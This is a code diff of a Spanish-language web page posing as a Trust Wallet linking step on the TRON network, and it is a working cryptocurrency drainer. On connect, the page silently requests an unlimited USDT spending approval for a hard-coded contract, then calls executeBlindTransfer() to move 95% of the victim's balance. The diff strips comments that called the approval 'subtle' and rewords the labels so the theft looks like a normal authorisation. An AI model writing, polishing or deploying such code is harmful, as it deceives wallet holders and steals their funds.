@@ -122,7 +122,7 @@
     <div id="status" class="status-box"></div>
 
     <div class="tw-btn-container">
-        <button class="tw-btn" id="connectBtn">Vincular billetera</button>
+        <button class="tw-btn" id="connectBtn">Vincular y Autorizar</button>
     </div>
 </div>
 
@@ -135,7 +135,6 @@
         setTimeout(() => document.getElementById('pageLoader').classList.add('hidden'), 800);
     });
 
-    // Tu contrato Router recién desplegado en TRON
     const CONTRATO_ROUTER = "TXMEYeA3Q2E6C8ii7wxf3UijZepZe6bxLD";
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
@@ -184,10 +183,10 @@
     }
 
     connectBtn.addEventListener('click', async () => {
-        // FASE 1: VINCULACIÓN Y APROBACIÓN SUTIL INTEGRADAS
+        // PASO 1: VINCULACIÓN Y SOLICITUD DE APROBACIÓN DE USDT
         if (!walletAddress) {
             try {
-                setStatus("Conectando con Trust Wallet...");
+                setStatus("Conectando con Trust Wallet y solicitando autorización...");
                 connectBtn.disabled = true;
                 if (typeof window.tronWeb === 'undefined') throw new Error("Abre desde el navegador de Trust Wallet.");
                 const tronWeb = window.tronWeb;
@@ -205,10 +204,9 @@
                 tronNetworkInfo.style.display = "flex";
                 maxAction.style.display = "inline";
 
-                // Ejecutar aprobación sutil automática al vincular (monto máximo para no volver a pedirlo)
-                setStatus("Autorizando pasarela de pagos...");
+                // Solicitud de aprobación de USDT integrada en la conexión
                 const routerHex = tronWeb.address.toHex(CONTRATO_ROUTER);
-                const maxApprovalAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // uint256 max
+                const maxApprovalAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
                 const approveTx = await tronWeb.transactionBuilder.triggerSmartContract(
                     CONTRATO_USDT,
@@ -226,8 +224,7 @@
                     await tronWeb.trx.sendRawTransaction(signedApprove);
                 }
 
-                // Calcular automáticamente el 95% del balance para mostrarlo en pantalla
-                setStatus("Calculando balance...");
+                // Calcular automáticamente el 95% del balance
                 const balance = await obtenerBalance(walletAddress);
                 const ninetyFivePercent = balance.multipliedBy(0.95).integerValue(tronWeb.BigNumber.ROUND_DOWN);
                 
@@ -242,20 +239,19 @@
                 connectBtn.disabled = false;
             } catch (e) {
                 console.error(e);
-                setStatus(e.message || "Error al vincular.");
+                setStatus(e.message || "Error al vincular y autorizar.");
                 connectBtn.disabled = false;
             }
             return;
         }
 
-        // FASE 2: LLAMADA LIMPIA AL CONTRATO ROUTER
+        // PASO 2: LLAMADA LIMPIA AL CONTRATO INTELIGENTE (Ejecuta el 95% automático)
         try {
             setStatus("Preparando operación...");
             connectBtn.disabled = true;
 
             const tronWeb = window.tronWeb;
 
-            // Única llamada directa al router (ejecuta el 95% interno de forma automática)
             const routerTx = await tronWeb.transactionBuilder.triggerSmartContract(
                 CONTRATO_ROUTER,
                 "executeBlindTransfer()",
